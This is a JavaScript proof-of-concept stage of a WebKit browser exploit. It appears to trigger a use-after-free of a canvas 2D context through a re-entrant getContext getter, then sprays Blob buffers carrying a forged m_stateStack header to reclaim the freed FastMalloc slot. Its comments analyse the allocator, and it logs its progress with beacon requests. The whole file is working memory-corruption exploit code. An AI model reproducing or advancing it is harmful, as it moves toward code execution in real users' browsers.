// p497 — FastMalloc carrier: BlobBuilder's Vector<uint8_t>.
//
// Why this carrier is new:
//   WTF/wtf/Forward.h:67  `using VectorBufferMalloc = FastMalloc;`
//   BlobBuilder::append(ArrayBufferView&&) does
//       m_appendableData.append(view.baseAddress(), view.byteLength())   (BlobBuilder.cpp:56-61)
//   so a `new Blob([u8])` copies the bytes into a Vector<uint8_t> whose
//   buffer is allocated by FastMalloc — the SAME allocator as
//   CanvasRenderingContext2D (WTF_MAKE_FAST_ALLOCATED).
//   AB backing stores (Gigacage) and StringImpl (StringImplMalloc) are
//   different heaps, which is exactly why p494..p496 all died at save().
//
// Occupancy test only: the vector buffer is filled with 0x42 + a forged
// m_stateStack at 0x70. After save(), read every Blob back with
// blob.arrayBuffer() and look for the 0->1 marker at 0x250. We do NOT call
// lineWidth here (no known mapped CAND yet).
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','BLOB','SAVE','DONE','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V497-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000,
               0x30000000, 0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p497cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;
    localStorage.setItem('p497cand', String(idx + 1));
  } catch (e) {}
  var CAND = CANDS[idx];

  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  // Payload: 712 bytes (the context is ~712). Marker at 0, forged state header
  // at 0x70 (m_buffer=CAND, capacity=1, size=1), zeros elsewhere incl. 0x250.
  var SIZE = 712;
  var payload = new Uint8Array(SIZE);
  for (var j = 0; j < SIZE; j++) payload[j] = 0x42;
  var hi32 = Math.floor(CAND / 4294967296);
  // The vector buffer base IS the object base when it takes the slot,
  // so m_stateStack is at +0x70 (not the string-data +0x58).
  payload[0x70] = CAND & 0xff;
  payload[0x71] = (CAND >>> 8) & 0xff;
  payload[0x72] = (CAND >>> 16) & 0xff;
  payload[0x73] = (CAND >>> 24) & 0xff;
  payload[0x74] = hi32 & 0xff;
  payload[0x75] = (hi32 >>> 8) & 0xff;
  payload[0x76] = (hi32 >>> 16) & 0xff;
  payload[0x77] = (hi32 >>> 24) & 0xff;
  payload[0x78] = 1; payload[0x7C] = 1;
  // 0x250 stays 0x42; the save() write turns it into 0x00000001 (first byte 1).

  var inner = null;
  var tc = document.createElement('canvas');
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });
  S('TRIG', 'inner=' + (!!inner) + ' outer=' + (!!outer));
  if (!inner) { S('DONE', 'no-inner'); return; }

  // First FastMalloc 712-class allocations after the free.
  var N = 32, blobs = [];
  for (var i = 0; i < N; i++) blobs.push(new Blob([payload]));
  S('BLOB', 'n=' + N + ' size=' + SIZE);

  // Deref-free marker: save() is ++m_unrealizedSaveCount at object+0x250.
  inner.save();

  // Read back every blob; the occupant's buffer now has 1 at 0x250.
  var pending = N, hit = -1, hitSize = -1;
  function finish() {
    if (pending !== 0) return;
    if (hit >= 0) S('SAVE', 'hit i=' + hit + ' size=' + hitSize);
    else S('SAVE', 'miss');
    S('DONE', 'blob-carrier');
  }
  for (var k = 0; k < N; k++) (function (kk) {
    blobs[kk].arrayBuffer().then(function (buf) {
      var u = new Uint8Array(buf);
      if (u.length > 0x250 && u[0x250] === 1) { hit = kk; hitSize = u.length; }
      pending--; finish();
    }, function () { pending--; finish(); });
  })(k);
})();
